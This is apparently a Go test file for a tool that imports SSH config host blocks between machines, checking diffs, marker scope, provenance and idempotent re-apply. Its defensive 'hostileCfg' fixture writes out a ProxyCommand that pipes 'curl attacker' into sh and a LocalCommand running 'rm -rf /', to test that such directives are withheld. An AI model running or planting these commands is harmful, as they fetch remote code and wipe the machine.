package cfgplan

import (
	"reflect"
	"strings"
	"testing"
)

const localCfg = "Host keep  #fleet\n    HostName 10.0.0.1\n    User me\n"

func TestBuildClassifiesAddUpdateAndUnchanged(t *testing.T) {
	remote := "Host keep  #fleet\n    HostName 10.0.0.9\n    User me\n" +
		"Host fresh  #fleet\n    HostName 10.0.0.2\n"
	p, err := Build(localCfg, remote, Opts{Marker: "#fleet", Source: "src"})
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]ChangeKind{}
	for _, c := range p.Changes {
		got[c.Alias] = c.Kind
	}
	if got["fresh"] != Add {
		t.Errorf("fresh = %q, want %q", got["fresh"], Add)
	}
	if got["keep"] != Update {
		t.Errorf("keep = %q, want %q", got["keep"], Update)
	}
}

// A field that did not move must not be reported as a change: the diff is the
// operator's only safety, so noise in it is a correctness problem.
func TestBuildReportsOnlyFieldsThatMoved(t *testing.T) {
	remote := "Host keep  #fleet\n    HostName 10.0.0.9\n    User me\n"
	p, _ := Build(localCfg, remote, Opts{Marker: "#fleet", Source: "src"})
	if len(p.Changes) != 1 || len(p.Changes[0].Fields) != 1 {
		t.Fatalf("want exactly one field delta, got %+v", p.Changes)
	}
	if f := p.Changes[0].Fields[0]; f.Name != "HostName" || f.From != "10.0.0.1" || f.To != "10.0.0.9" {
		t.Fatalf("delta = %+v", f)
	}
}

// Only marked blocks travel unless All is set — the source decides what it shares.
func TestBuildHonoursTheMarkerScope(t *testing.T) {
	remote := "Host personal\n    HostName 10.0.0.3\n"
	if p, _ := Build("", remote, Opts{Marker: "#fleet"}); len(p.Changes) != 0 {
		t.Fatalf("unmarked host must not travel, got %+v", p.Changes)
	}
	if p, _ := Build("", remote, Opts{Marker: "#fleet", All: true}); len(p.Changes) != 1 {
		t.Fatalf("--all must include it, got %+v", p.Changes)
	}
}

// Omission is not an instruction to delete.
func TestBuildNeverBlanksAFieldTheSourceOmitted(t *testing.T) {
	p, _ := Build(localCfg, "Host keep  #fleet\n    HostName 10.0.0.9\n", Opts{Marker: "#fleet"})
	if len(p.Changes) != 1 {
		t.Fatalf("changes = %+v", p.Changes)
	}
	if p.Changes[0].Host.User != "me" {
		t.Fatalf("User = %q, want the local value preserved", p.Changes[0].Host.User)
	}
}

// The hostile fixture is a permanent regression test: every directive here
// executes a command on the IMPORTING machine, so none may ever reach the
// output. Exec-safety is structural — sshconf.Host has no field to hold them.
const hostileCfg = `Host evil  #fleet
    HostName 10.0.0.6
    ProxyCommand /bin/sh -c 'curl attacker|sh'
    LocalCommand /bin/rm -rf /
    PermitLocalCommand yes
`

func TestBuildNeverCarriesAnExecDirective(t *testing.T) {
	p, _ := Build("", hostileCfg, Opts{Marker: "#fleet", Source: "src"})
	out, err := p.Apply("")
	if err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"ProxyCommand", "LocalCommand", "PermitLocalCommand", "curl", "rm -rf"} {
		if strings.Contains(out, bad) {
			t.Fatalf("applied config contains %q:\n%s", bad, out)
		}
	}
}

func TestBuildNamesWhatItWithheld(t *testing.T) {
	p, _ := Build("", hostileCfg, Opts{Marker: "#fleet"})
	want := []string{"LocalCommand", "PermitLocalCommand", "ProxyCommand"}
	if !reflect.DeepEqual(p.NotImported, want) {
		t.Fatalf("NotImported = %v, want %v", p.NotImported, want)
	}
}

// cat does not follow Include; silently missing those hosts is worse than
// saying so. A commented-out Include is not a directive.
func TestBuildCountsIncludeDirectives(t *testing.T) {
	cfg := "Include ~/.ssh/work.d/*\n# Include commented-out\nHost a  #fleet\n    HostName 10.0.0.7\n"
	p, _ := Build("", cfg, Opts{Marker: "#fleet"})
	if p.Includes != 1 {
		t.Fatalf("Includes = %d, want 1", p.Includes)
	}
}

// A pattern block configures defaults, not a machine. Parse skips them, so
// their directives are not withheld from anything and must not be reported.
func TestBuildDoesNotReportDirectivesFromPatternBlocks(t *testing.T) {
	cfg := "Host *\n    ServerAliveInterval 60\nHost a  #fleet\n    HostName 10.0.0.8\n"
	p, _ := Build("", cfg, Opts{Marker: "#fleet"})
	if len(p.NotImported) != 0 {
		t.Fatalf("NotImported = %v, want empty", p.NotImported)
	}
}

// Provenance rides in the marker string, and carries NO timestamp, so a repeat
// transfer is a genuine no-op instead of perpetual churn.
func TestApplyStampsProvenanceAndStaysIdempotent(t *testing.T) {
	remote := "Host fresh  #fleet\n    HostName 10.0.0.2\n"
	p, _ := Build("", remote, Opts{Marker: "#fleet", Source: "src"})
	once, err := p.Apply("")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(once, "imported-from=src") {
		t.Fatalf("no provenance:\n%s", once)
	}
	p2, _ := Build(once, remote, Opts{Marker: "#fleet", Source: "src"})
	if !p2.Empty() {
		t.Fatalf("second transfer is not a no-op: %+v", p2.Changes)
	}
	twice, _ := p2.Apply(once)
	if twice != once {
		t.Fatalf("re-apply changed bytes:\n%q\n---\n%q", once, twice)
	}
}

// An update must not be destructive, and must not reorder the file.
func TestApplyUpdatesWithoutDestroyingLocalLines(t *testing.T) {
	local := "Host a  #fleet\n    HostName 10.0.0.1\n    ProxyCommand nc %h %p\n\nHost z  #fleet\n    HostName 10.0.0.5\n"
	p, _ := Build(local, "Host a  #fleet\n    HostName 10.0.0.9\n", Opts{Marker: "#fleet", Source: "src"})
	got, err := p.Apply(local)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "ProxyCommand nc %h %p") {
		t.Fatalf("update was destructive:\n%s", got)
	}
	if !strings.Contains(got, "10.0.0.9") {
		t.Fatalf("update did not land:\n%s", got)
	}
	if strings.Index(got, "Host a") > strings.Index(got, "Host z") {
		t.Fatalf("update reordered the file:\n%s", got)
	}
}
